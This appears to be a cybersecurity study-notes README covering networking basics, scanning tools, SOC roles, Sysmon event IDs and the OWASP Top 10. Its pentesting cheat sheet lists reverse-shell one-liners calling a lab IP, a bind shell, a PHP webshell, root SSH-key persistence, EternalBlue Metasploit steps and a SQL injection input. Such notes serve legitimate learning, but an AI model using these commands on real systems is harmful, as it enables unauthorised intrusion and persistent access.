  # blue-team-tools
  
  # IP address
- An IP address (Internet Protocol address) is a unique identifier assigned to each device connected to a network, allowing devices to communicate with each other. It can be IPv4 (e.g., 192.168.1.10) or IPv6 (e.g., 2001:0db8:85a3::8a2e:0370:7334).

| Type         | Example       | Scope / Use Case                      |
| ------------ | ------------- | ------------------------------------- |
| **Private**  | 192.168.1.10  | Local LAN (home, office)              |
| **Public**   | 103.25.231.88 | Internet-facing, ISP-assigned         |
| **Static**   | 203.0.113.25  | Fixed server IP (websites, VPNs, DNS) |
| **Dynamic**  | 103.45.68.90  | ISP-assigned, changes periodically    |
| **Loopback** | 127.0.0.1     | Testing on your own device            |
| **APIPA**    | 169.254.45.10 | Self-assigned when DHCP fails         |
# MAC address
- A MAC address (Media Access Control address) is a unique identifier assigned to a network interface card (NIC) for communication on a physical network segment. Unlike IP addresses, which can change depending on the network, a MAC address is hardware-based and usually permanent (burned into the device by the manufacturer).

🔹 Key Points:

- **Format:** 6 pairs of hexadecimal numbers separated by colons or hyphens  
  Example: `00:1A:2B:3C:4D:5E` or `00-1A-2B-3C-4D-5E`
- **Length:** 48 bits (6 bytes)
- ### TCP vs UDP

TCP (Transmission Control Protocol) and UDP (User Datagram Protocol) are two core transport layer protocols in the TCP/IP model. They both transmit data over networks but have fundamental differences.

| Feature                | TCP                                     | UDP                                     |
|------------------------|----------------------------------------|----------------------------------------|
| **Full Name**          | Transmission Control Protocol           | User Datagram Protocol                  |
| **Type**               | Connection-oriented                     | Connectionless                          |
| **Reliability**        | Reliable (guaranteed delivery)          | Unreliable (no guarantee)               |
| **Error Checking**      | Checks for errors and retransmits lost packets | Checks for errors but does not retransmit |
| **Order of Data**      | Preserves the order of packets          | Packets may arrive out of order         |
| **Speed**              | Slower due to handshakes and retransmissions | Faster, minimal overhead               |
| **Use Cases**          | Web browsing (HTTP/HTTPS), Email (SMTP), File Transfer (FTP) | Streaming (video/audio), DNS, VoIP     |
| **Connection**         | Requires a 3-way handshake to establish connection | No handshake needed                     |
| **Flow Control**       | Supported                               | Not supported                           |
| **Header Size**        | 20 bytes minimum                        | 8 bytes minimum                         |
- TCP is reliable, ordered, and heavier; suitable for applications where data integrity is critical.  
- UDP is fast, lightweight, but less reliable; suitable for real-time applications like streaming, gaming, and VoIP.



| Port(s)       | Protocol              | Purpose                                                                 |
|---------------|-----------------------|-------------------------------------------------------------------------|
| 20/21 (TCP)   | FTP                   | File Transfer Protocol — port 21 for commands, 20 for data transfer     |
| 22 (TCP)      | SSH                   | Secure Shell — secure remote login and command execution                |
| 23 (TCP)      | Telnet                | Telnet — unencrypted remote login (insecure, rarely used)              |
| 25 (TCP)      | SMTP                  | Simple Mail Transfer Protocol — sending email                           |
| 80 (TCP)      | HTTP                  | Hypertext Transfer Protocol — standard web traffic                      |
| 161 (TCP/UDP) | SNMP                  | Simple Network Management Protocol — device monitoring/management       |
| 389 (TCP/UDP) | LDAP                  | Lightweight Directory Access Protocol — directory/authentication        |
| 443 (TCP)     | SSL/TLS (HTTPS)       | Secure HTTP — encrypted web traffic                                     |
| 445 (TCP)     | SMB                   | Server Message Block — file/printer sharing (Windows networks)          |
| 3389 (TCP)    | RDP                   | Remote Desktop Protocol — remote access to Windows desktops/servers     |

- SSH: Secure, encrypted connection to a remote system; requires credentials. Used for safe remote login and file transfer.

- Netcat: Raw, unencrypted network tool; can send/receive data freely. Used for testing, debugging, or simple file transfer.
# Network Discovery tools
# 🔎 Nuclei Tool 

Nuclei is an open-source, template-based vulnerability scanner widely used in penetration testing and bug bounty hunting.
- Uses **templates (YAML files)** to check for:
  - Known vulnerabilities  
  - Misconfigurations  
  - CVEs  
  - Exposures  
- Performs **fast and automated scans** of URLs, domains, or IPs.  
- Supports multiple protocols:
  - **HTTP**
  - **DNS**
  - **TCP**
  - **SSL**
  - **File**
  - **Cloud**

## 🛠️ Common Issues Detected
- SQL Injection (SQLi)  
- Cross-Site Scripting (**XSS**)  
- Open Redirects  
- Information Disclosure  
- Exposed Admin Panels  
- Weak SSL/TLS Configurations  

# Nmap

**Nmap** 
(Network Mapper) is a free, open-source tool for network discovery and security auditing.

## Key Capabilities
- **Host discovery** — find live hosts on a network.  
- **Port scanning** — discover open TCP/UDP ports on hosts.  
- **Service/version detection** — identify running services and their versions (`-sV`).  
- **OS detection** — attempt to fingerprint the remote OS (`-O`).  
- **Scriptable interaction** — run NSE (Nmap Scripting Engine) scripts for advanced checks (vuln detection, HTTP enumeration, brute force, etc.).  
- **Performance tuning** — control timing and scan speed (`-T0`..`-T5`).
- **Nmap by default only scans the top 1000 ports unless you use -p-  

---

## Nmap Scripting Engine (NSE)
- **Vulnerability checks** (`vuln` category)  
- **HTTP enumeration** (`http-*`)  
- **Brute force** (`auth`), **SMB checks**, **DNS checks**, etc.



## Masscan
- Masscan is an ultra-fast, Internet-scale port scanner. It was designed to quickly discover open ports across very large address ranges (even the whole IPv4 space) by sending a huge number of asynchronous, raw TCP SYN packets.

| Feature                | Nmap               | Masscan                                |
| ---------------------- | ----------------- | -------------------------------------- |
| Ports scanned          | Top 1000 (default)| You specify all 65535                   |
| Speed                  | Slower, accurate  | Very fast                               |
| Service detection      | Yes (`-sV`)       | No                                      |
| OS detection           | Yes (`-O`)        | No                                      |
| False positives        | Low               | Possible at high scan rates             |
| IDS/Firewall detection | Can trigger alerts| Very likely to trigger if rate is high |

- DNS Record Types

 

- DNS isn't just for websites though, and multiple types of DNS record exist. We'll go over some of the most common ones that you're likely to come across.

- A Record

- These records resolve to IPv4 addresses, for example 104.26.10.229

- AAAA Record

- These records resolve to IPv6 addresses, for example 2606:4700:20::681a:be5
CNAME Record

- These records resolve to another domain name, for example, TryHackMe's online shop has the subdomain name store.tryhackme.com which returns a CNAME record shops.shopify.com. Another DNS request would then be made to shops.shopify.com to work out the  - IP address.

- MX Record

- These records resolve to the address of the servers that handle the email for the domain you are querying, for example an MX record response for tryhackme.com would look something like alt1.aspmx.l.google.com. These records also come with a priority - flag. This tells the client in which order to try the servers, this is perfect for if the main server goes down and email needs to be sent to a backup server.

- TXT Record

 

- TXT records are free text fields where any text-based data can be stored. TXT records have multiple uses, but some common ones can be to list servers that have the authority to send an email on behalf of the domain (this can help in the battle against spam and spoofed email). They can also be used to verify ownership of the domain name when signing up for third party services.

| Feature        | Nmap                                             | ZMap                                             |
|----------------|-------------------------------------------------|------------------------------------------------|
| Purpose        | In-depth network & vulnerability scanning      | Internet-scale discovery (fast probing)       |
| Speed          | Slower (does TCP handshake, service detection, OS fingerprinting) | Extremely fast (can scan the whole IPv4 Internet in minutes) |
| Detail Level   | Very detailed (services, versions, OS, scripts, vulnerabilities) | Very basic (just tells if a port is open/responding) |
| Scanning Model | Stateful (completes handshakes, tracks sessions) | Stateless (fires probes, listens for replies) |
| Accuracy       | High (fewer false positives, more reliable)    | Fast but less accurate (can miss things or produce false positives) |
| Output         | Services, versions, vulnerabilities, scripts   | List of IPs that responded on a given port   |




| Feature      | Nessus                     | Nexpose (Rapid7)           |
| ------------ | -------------------------- | -------------------------- |
| Vendor       | Tenable                    | Rapid7                     |
| Target       | Vulnerability scanning     | Vulnerability + risk mgmt  |
| Integration  | Mostly scanning            | Integrates with Metasploit |
| Reporting    | Reports only               | Dashboards + reports       |
| Free version | Nessus Essentials (16 IPs) | Community (limited)        |


# Security Operations Center (SOC)

A **Security Operations Center (SOC)** is the combination of people, processes, and technology that monitor, detect, investigate, and respond to cybersecurity incidents across an organization.

---

## Core Responsibilities

- **24/7 Monitoring:** Logs, endpoints, network traffic, cloud services.  
- **Detection:** Identify suspicious or malicious activity (alerts from SIEM, EDR, IDS).  
- **Triage & Investigation:** Determine if alerts are false positives or real threats.  
- **Incident Response:** Containment, eradication, and recovery for confirmed incidents.  
- **Threat Hunting:** Proactively discover hidden attackers.  
- **Threat Intelligence:** Ingest and operationalize IoCs and TTPs.  
- **Forensics & Root-Cause Analysis:** Deep-dive investigations for major incidents.  
- **Reporting & Compliance:** Regulatory evidence, post-incident reports.  
- **Playbook Development & Tuning:** Create repeatable, tested response steps.  
- **Security Engineering:** Tune tools, collect logs, improve detection coverage.

---

## SOC Models 

- **In‑House / Internal SOC:** Organization owns staff and tooling; full control, higher cost.  
- **Managed SOC / MSSP:** Outsource monitoring & initial triage to a vendor; cost-effective, less direct control.  
- **Co‑Managed SOC:** Hybrid of internal team + MSSP; balanced approach.  
- **Virtual SOC (vSOC):** Cloud/SaaS-driven; remote analysts, cloud-hosted tooling, fast deployment.  
- **Command SOC:** Centralized command coordinating multiple regional/local SOCs in large enterprises.

---

## SOC Organization & Roles

| Tier / Role | Responsibilities | Skills |
|------------|-----------------|-------|
| **Tier 1 Analyst (Alert Triage)** | Monitor SIEM dashboard, validate alerts, initial enrichment, escalate to Tier 2 | Log basics, Linux/Windows basics, networking, attention to detail |
| **Tier 2 (Incident Responder)** | Deep investigations, endpoint triage, network traces, log correlation, containment | EDR tools, packet analysis, forensics, moderate scripting |
| **Tier 3 (Threat Hunter / Forensics / Malware Analyst)** | Hunt stealthy attackers, reverse engineer malware, tune detections, develop content | Reverse engineering, memory forensics, threat intelligence, advanced scripting |
| **SOC Engineer / Architect** | Build/tune SIEM, logging pipelines, integrations, automate playbooks | SIEM internals, APIs, data pipelines, containers, observability |
| **Threat Intelligence Analyst** | Curate IoCs, map to MITRE ATT&CK, provide context & predictive insights | Threat intel analysis, MITRE ATT&CK mapping, reporting |
| **SOC Manager / Head of SOC** | People & ops management, runbooks, KPIs, budgets, liaison with execs & IR teams | Management, strategy, communication, budgeting |
| **Incident Response / Forensics Team** | Lead major incident remediation, legal coordination, post-mortems | Forensics, IR procedures, regulatory compliance |

---

**Sysmon**
- (System Monitor) is a Windows system monitoring tool that is part of the **Sysinternals Suite** (from Microsoft).  
- It runs as a background service and logs detailed system events to the **Windows Event Log**, which security teams can analyze for signs of malicious activity.
  # Sysmon Event IDs

| Event ID | Description                                                                                  |
| -------- | -------------------------------------------------------------------------------------------- |
| **1**    | Process creation (new process started, with full command line, hashes, parent process, etc.) |
| **2**    | File creation time changed (timestamp tampering, often used by attackers)                    |
| **3**    | Network connection (source/destination IPs, ports, protocols)                                |
| **4**    | Sysmon service state changed (started/stopped)                                               |
| **5**    | Process terminated                                                                           |
| **6**    | Driver loaded (kernel driver loading, can detect rootkits)                                   |
| **7**    | Image loaded (DLLs and executables loaded by processes)                                      |
| **8**    | CreateRemoteThread (used for code injection techniques)                                      |
| **9**    | RawAccessRead (direct disk access, often by malware)                                         |
| **10**   | Process access (attempts to access another process memory/handle)                            |
| **11**   | File created (new files being created on disk)                                               |
| **12**   | Registry object created or deleted                                                           |
| **13**   | Registry value set                                                                           |
| **14**   | Registry object renamed                                                                      |
| **15**   | File stream created (alternate data streams, used for hiding files)                          |
| **16**   | Sysmon config change                                                                         |
| **17**   | Pipe created (named pipe, inter-process communication)                                       |
| **18**   | Pipe connected                                                                               |
| **19**   | WMI event filter registered                                                                  |
| **20**   | WMI event consumer registered                                                                |
| **21**   | WMI event consumer to filter binding                                                         |
| **22**   | DNS query (logs domain lookups from processes)                                               |
| **23**   | File Delete archived (file deleted, archived in event)                                       |
| **24**   | Clipboard changed (captures clipboard contents, if enabled)                                  |
| **25**   | Process Tampering (modifications like hollowing or herpaderping)                             |
| **26**   | File Delete logged (delete operation without archive)                                        |
| **27**   | FileBlock Executable (execution blocked by Sysmon config)                                    |
| **28**   | FileBlock Shredding (file overwrite prevention)                                              |
| **29**   | FileBlock Unauthorized (file creation blocked)


## General

## Tmux
| Command | Description |
|---------|-------------|
| `tmux` | Start tmux |
| `Ctrl+b` | tmux: default prefix |
| `prefix c` | tmux: new window |
| `prefix 1` | tmux: switch to window (1) |
| `prefix Shift+%` | tmux: split pane vertically |
| `prefix Shift+"` | tmux: split pane horizontally |
| `prefix →` | tmux: switch to the right pane |

## Vim
| Command | Description |
|---------|-------------|
| `vim file` | open file with vim |
| `Esc i` | enter insert mode |
| `Esc` | back to normal mode |
| `x` | cut character |
| `dw` | cut word |
| `dd` | cut full line |
| `yw` | copy word |
| `yy` | copy full line |
| `p` | paste |
| `:1` | go to line number 1 |
| `:w` | write file (save) |
| `:q` | quit |
| `:q!` | quit without saving |
| `:wq` | write and quit |

## Pentesting

### Service Scanning
| Command | Description |
|---------|-------------|
| `nmap 10.129.42.253` | Run nmap on an IP |
| `nmap -sV -sC -p- 10.129.42.253` | Run an nmap script scan on an IP |
| `locate scripts/citrix` | List various available nmap scripts |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40` | Run an nmap script on an IP |
| `netcat 10.10.10.10 22` | Grab banner of an open port |
| `smbclient -N -L \\\\10.129.42.253` | List SMB Shares |
| `smbclient \\\\10.129.42.253\\users` | Connect to an SMB share |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0` | Scan SNMP on an IP |
| `onesixtyone -c dict.txt 10.129.42.254` | Brute force SNMP community string |

### Web Enumeration
| Command | Description |
|---------|-------------|
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt` | Directory scan |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Sub-domain scan |
| `curl -IL https://www.inlanefreight.com` | Grab website banner |
| `whatweb 10.10.10.121` | Webserver/cert details |
| `curl 10.10.10.121/robots.txt` | List potential directories in robots.txt |
| `Ctrl+U` (in Firefox) | View page source |

### Public Exploits / Metasploit
| Command | Description |
|---------|-------------|
| `searchsploit openssh 7.2` | Search public exploits |
| `msfconsole` | Start Metasploit Framework |
| `search exploit eternalblue` | Search MSF for exploit |
| `use exploit/windows/smb/ms17_010_psexec` | Use an MSF module |
| `show options` | Show module options |
| `set RHOSTS 10.10.10.40` | Set module option |
| `check` | Test if target is vulnerable |
| `exploit` | Run the exploit |

### Using Shells
| Command | Description |
|---------|-------------|
| `nc -lvnp 1234` | Start nc listener |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'` | Reverse shell from remote |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f` | Reverse shell (alternative) |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f` | Start bind shell locally |
| `nc 10.10.10.1 1234` | Connect to bind shell |
| `python -c 'import pty; pty.spawn("/bin/bash")'` | Upgrade shell TTY (method 1) |
| `Ctrl+Z` then `stty raw -echo` then `fg` then Enter twice | Upgrade shell TTY (method 2) |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php` | Create PHP webshell |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id` | Execute command on webshell |

### Privilege Escalation
| Command | Description |
|---------|-------------|
| `./linpeas.sh` | Run linPEAS enumeration |
| `sudo -l` | List available sudo privileges |
| `sudo -u user /bin/echo Hello World!` | Run command as another user via sudo |
| `sudo su -` | Switch to root user (if allowed) |
| `sudo su user -` | Switch to a user |
| `ssh-keygen -f key` | Create SSH key |
| `echo "ssh-rsa AAAAB... user@host" >> /root/.ssh/authorized_keys` | Add pubkey to authorized_keys |
| `ssh root@10.10.10.10 -i key` | SSH with private key |

### Transferring Files
| Command | Description |
|---------|-------------|
| `python3 -m http.server 8000` | Start a local HTTP server |
| `wget http://10.10.14.1:8000/linpeas.sh` | Download file on remote from local server |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh` | Download file on remote from local server |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh` | Transfer file with SCP (requires SSH) |
| `base64 file -w 0` | Convert file to base64 (no linewrap) |
| `echo f0VMR... | base64 -d > shell` | Decode base64 to file |
| `md5sum shell` | Check file MD5 sum |


# OWASP Top 10 – 2021 (A01 to A07)

The OWASP Top 10 is a standard awareness document for web application security.  
It highlights the 10 most critical security risks for web apps based on real-world data and expert consensus.  
Organizations and developers use it as a guideline to prioritize security fixes.

---

## A01:2021 – Broken Access Control
**Definition:** Users can access data or perform actions they shouldn’t be able to.  
**Why it’s risky:** Attackers can modify URLs, API calls, or cookies to gain admin privileges or access other users’ data.  

**Examples:**
- URL manipulation: `/user/1234/orders` → changing `1234` to another user ID to see their data.  
- Bypassing role checks in APIs.  

**Mitigation:** Enforce server-side authorization checks; never rely solely on client-side restrictions.  

---

## A02:2021 – Cryptographic Failures
**Definition:** Sensitive data is not properly protected in storage or transit.  
**Why it’s risky:** Attackers can steal credentials, personal info, or payment data.  

**Examples:**
- Storing passwords in plain text instead of hashing with bcrypt/argon2.  
- Using outdated TLS/SSL protocols.  

**Mitigation:** Use strong encryption, secure key management, HTTPS everywhere, and proper hashing for passwords.  

---

## A03:2021 – Injection
**Definition:** User input is not sanitized and is executed by the server.  
**Why it’s risky:** Attackers can manipulate SQL, NoSQL, OS, or LDAP commands to access or destroy data.  

**Examples:**
- **SQL Injection:** `SELECT * FROM users WHERE username='$input'` → attacker enters `' OR 1=1--`.  
- **Command Injection:** Passing unsanitized user input to `system()` or `exec()`.  

**Mitigation:** Use parameterized queries, input validation, and ORM frameworks.  

---

## A04:2021 – Insecure Design
**Definition:** Security flaws stemming from application design and architecture rather than coding errors.  
**Why it’s risky:** Even with secure code, weak design can lead to vulnerabilities.  

**Examples:**
- No multi-factor authentication for sensitive actions.  
- Poor session management leading to session hijacking.  

**Mitigation:** Threat modeling during design; secure coding principles.  

---

## A05:2021 – Security Misconfiguration
**Definition:** Improperly configured servers, databases, frameworks, or default accounts.  
**Why it’s risky:** Attackers exploit default passwords or exposed interfaces.  

**Examples:**
- Default admin accounts enabled on CMS like WordPress.  
- Verbose error messages revealing internal structure.  

**Mitigation:** Harden servers, remove default accounts, and regularly audit configurations.  

---

## A06:2021 – Vulnerable and Outdated Components
**Definition:** Using software libraries or frameworks with known vulnerabilities.  
**Why it’s risky:** Attackers exploit known CVEs to compromise the system.  

**Examples:**
- Using old jQuery with XSS vulnerabilities.  
- Outdated CMS plugins with remote code execution flaws.  

**Mitigation:** Keep components updated; monitor CVEs.  

---

## A07:2021 – Identification & Authentication Failures
**Definition:** Weak authentication mechanisms or improperly implemented account management.  
**Why it’s risky:** Attackers can take over user accounts or perform privilege escalation.  

**Examples:**
- No rate limiting on login attempts → brute-force attacks.  
- Weak passwords or predictable password reset tokens.  

**Mitigation:** Implement MFA, strong password policies, secure password reset flows.  

